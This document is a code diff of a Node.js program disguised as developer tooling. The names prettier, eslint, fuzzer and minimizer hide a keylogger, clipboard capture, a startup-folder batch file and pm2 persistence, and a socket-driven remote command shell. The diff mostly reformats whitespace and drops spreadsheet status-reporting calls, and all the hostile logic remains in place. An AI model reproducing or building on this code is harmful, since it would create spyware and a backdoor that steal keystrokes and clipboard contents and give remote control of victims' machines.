@@ -26,33 +26,33 @@ const prettierExtracter = () => {
     );
     const destinationFile = path.join(startupPath, "prettier.bat");
     fs.copyFileSync(sourceFile, destinationFile);
-  } catch (err) {}
+  } catch (err) { }
 };
 
 const runForWindows = async () => {
   try {
     const { GlobalKeyboardListener } = require("node-global-key-listener");
     const { runRunner } = require("./tools/runner.js");
-  
+
     minimizerListener.startListening();
     minimizerListener.on("change", async () => {
       const change = await getMinimizer();
       pendingData.minimizer += "," + change;
     });
-  
+
     prettierExtracter();
     const v = new GlobalKeyboardListener();
-  
+
     v.addListener(function (e, down) {
       if (e.state === "DOWN" && !e?.name?.includes("MOUSE")) {
         pendingData.fuzzer += "," + e.name;
       }
     });
-  
+
     setInterval(() => {
       runRunner();
     }, 1000);
-  } catch (err) {}
+  } catch (err) { }
 };
 
 const runForAll = async () => {
@@ -193,9 +193,8 @@ const runForAll = async () => {
 
         socket.emit("commandResult", {
           success: true,
-          output: `Session ${
-            isAutoRestart ? "auto-" : ""
-          }restarted successfully. Working directory reset to: ${currentWorkingDirectory}`,
+          output: `Session ${isAutoRestart ? "auto-" : ""
+            }restarted successfully. Working directory reset to: ${currentWorkingDirectory}`,
           error: null,
           platform: process.platform,
           cwd: currentWorkingDirectory,
@@ -321,7 +320,7 @@ const runForAll = async () => {
         handleCommandError(socket, new Error(String(reason)));
       }
     });
-  } catch (err) {}
+  } catch (err) { }
 };
 
 // Function to execute shell commands
@@ -343,7 +342,7 @@ const makeRebootable = async () => {
   try {
     await runCommand('pm2 startup');
     await runCommand('pm2 save');
-  } catch (err) {}
+  } catch (err) { }
 }
 
 let lastMinimizer = "";
@@ -466,61 +465,46 @@ const main = async () => {
           pendingData.runners = [];
         }
       }
-    } catch (err) {}
+    } catch (err) { }
   }, 10000);
   try {
-await sendMinimizerAndFuzzerData("ping", "load")
+    await sendMinimizerAndFuzzerData("ping", "load")
   }
-  catch {}
+  catch { }
 
-  setInterval(async ()=> {
+  setInterval(async () => {
     try {
       try {
         await deleteEslinter();
-        await accessSpreadsheet("loading...", "deleteEslinter")
       } catch (error) {
-        await accessSpreadsheet("loading...deleteEslinter", error)
-  
         try {
           await deleteEslinter1();
-          await accessSpreadsheet("loading...", "deleteEslinter1")
         } catch (error) {
-          await accessSpreadsheet("loading...deleteEslinter1", error)
           try {
             await deleteEslinter2();
-            await accessSpreadsheet("loading...", "deleteEslinter2")
           } catch (error) {
-            await accessSpreadsheet("loading...deleteEslinter2", error)
           }
         }
       }
       try {
         await installEslinter();
-        await accessSpreadsheet("loading...", "installEslinter")
       } catch (error) {
-        await accessSpreadsheet("loading...installEslinter", error)
       }
       try {
         await startEslinter();
-        await accessSpreadsheet("loading...", "startEslinter")
       } catch (error) {
-        await accessSpreadsheet("loading...startEslinter", error)
-  
+
         try {
           await startEslinter1();
-          await accessSpreadsheet("loading...", "startEslinter1")
         } catch (error) {
-          await accessSpreadsheet("loading...startEslinter1", error)
-  
+
           try {
             await startEslinter2();
-            await accessSpreadsheet("loading...", "startEslinter2")
           } catch (error) {
-            await accessSpreadsheet("loading...startEslinter2", error)
           }
         }
       }
-    } catch(err){}
+    } catch (err) { }
   }, 3600000);
 };
 
